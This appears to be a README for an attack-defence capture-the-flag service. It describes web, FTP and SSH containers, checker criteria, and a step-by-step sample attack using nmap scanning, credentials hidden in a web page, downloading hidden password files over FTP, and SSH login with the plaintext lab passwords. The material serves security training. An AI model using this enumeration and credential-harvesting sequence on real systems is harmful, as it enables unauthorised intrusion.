# Service definition:
- We have three dockers: 
1. An Ubuntu (latest version) with OpenSSH server. This docker contains the flag of the competition.
2. One who has install apache service. This server has an index.html with information about a user.
3. A Debian (latest version) with a FTP server. This server has different files stored in user's home and in the tmp the folder.
    - userlist: hidden file with the information of system users with its passwords.
    - ssh_users: information about users that has access to a SSH server.
The attacker has to enumerate the network to find an FTP server and access to it using the information availabe (hidden) in the web page stored in the web server.
The flags are stored in that SSH docker's file and attacker has to let them in his T-Submission machine. 

# Service implementation:
web docker is configured to take a copy index.html file from the host machine, letting it in '/usr/local/apache2/htdocs/index.html'. 
ssh docker is configured attending to the following tips:
  - It has openssh-server installed and started. 
  - It has a user called 'loki' whose password is 'K7l8M9n0'. 
ftp docker is configured attending to the following tips:
  - It has vsftpd installed.
  - It copies the following files from host machine:
    + vstfpd.conf --> /etc/vsftpd.conf: the vsftpd configuration file. This configuration allows the users listed in the file called vsftpd.chroot_list to move outside their home directory.
    + chroot_list --> /etc/vsftpd.chroot_list: this file lists the users that can move outside their home.
    + .userlist --> /home/test/.userlist: hidden file that contains a list of users and passwords.
    + .ssh_users --> /tmp//tmp/.ssh_users: hidden file that contains a list of user that have access to the SSH server.
It is also configured for creating /var/run/vsftpd/empty directory not to give an access error.
Besides, it must create 4 users and change the permissions of their respective home directories to 700.
Finally, it sarts the server through vsftpd daemon.
*Notice that in docker-compose.yml file "restart: unless-stopped" have been stated because ftp docker wasn't stable and went down several times without any apparent reason (normally, just after closing a connection, but not always). So, unless we manually execute "docker stop catchme_ftp_1", it will automatically start again.

-Flags: 
    Flags will be stored in 'pasapasa_ssh_1' docker's '/tmp/flags.txt' file.

# Checkers check
- Web server is active and working.
  - Port TCP/80 is openned.
  - When the page index.html is requested it responds with a 200.
  - The apache server has not been updated.
  - The index.html file has not been changed.
* Checks done:


- FTP server is active and working:
  - Port 21 is openned.
  - User odin has access to it.
  - vsftpd.chrrot_list has not been changed.
  - .userlist file has not been changed.
  - .ssh_users file has not been changed.
* Checks done:

- SSH server is active and working
* Checks done
 


# Attack example
Attack from TEAM1 to TEAM2:
- Analyze team2 network using nmap.
    nmap 10.0.2.101
    PORT   STATE SERVICE
      21/tcp open  ftp
      22/tcp open  ssh
      80/tcp open  http
- Analyze the web and obtain this user and password: test:U1v2W3x4
- Try this user in the ssh and FTP server. In the FTP server download .userlist file.
    ftp 10.0.2.101
    user: test
    password: U1v2W3x4
    ftp>ls -la
drwx------    1 1004     1004         4096 Dec 20 10:31 .
drwx------    1 1004     1004         4096 Dec 20 10:31 ..
-rw-r--r--    1 1004     1004          220 Mar 29  2024 .bash_logout
-rw-r--r--    1 1004     1004         3526 Mar 29  2024 .bashrc
-rw-r--r--    1 1004     1004          807 Mar 29  2024 .profile
-rw-r--r--    1 0        0             162 Dec 20 10:31 .userlist
    ftp>get .userlist
- Try those users in the FTP server. You look that the one that can move around the different directories is odin.
    ftp 10.0.2.101
    user: odin
    password: e5f6g7h8
    ftp> cd ..
    250 Directory successfully changed.
    ftp> pwd
    Remote directory: /home
- Analyze different directories. In the temporary directory usually it appears to be some important files. In this case in /tmp/ we have hidden file named .ssh_users. Doenload this file in order to analyze.
    ftp> cd /tmp/
    250 Directory successfully changed.
    ftp> ls -la
    229 Entering Extended Passive Mode (|||64770|)
    ftp: Can't connect to `10.0.2.101:64770': Connection refused
    200 EPRT command successful. Consider using EPSV.
    150 Here comes the directory listing.
    drwxrwxrwt    1 0        0            4096 Dec 20 10:31 .
    drwxr-xr-x    1 0        0            4096 Dec 20 10:31 ..
    -rw-r--r--    1 0        0               4 Dec 20 10:31 .ssh_users
    226 Directory send OK.
    ftp> get .ssh_users
    local: .ssh_users remote: .ssh_users
    200 EPRT command successful. Consider using EPSV.
    150 Opening BINARY mode data connection for .ssh_users (4 bytes).
    100% |***************************************************************************************************************************************************************|     4       69.75 KiB/s    00:00 ETA
    226 Transfer complete.
    4 bytes received in 00:00 (8.87 KiB/s)
- Use the user that is to connect to ssh. Remember that ssh port is 8822.
    ssh -p 8822 loki@10.0.2.101
- Analyze the content of this server to find the flag that is the temporary file.
- Attacker has to let the flag in his T-Submission machine, in a file with .flag extension located at /root directory (as, for example, /root/flag.flag). 





     



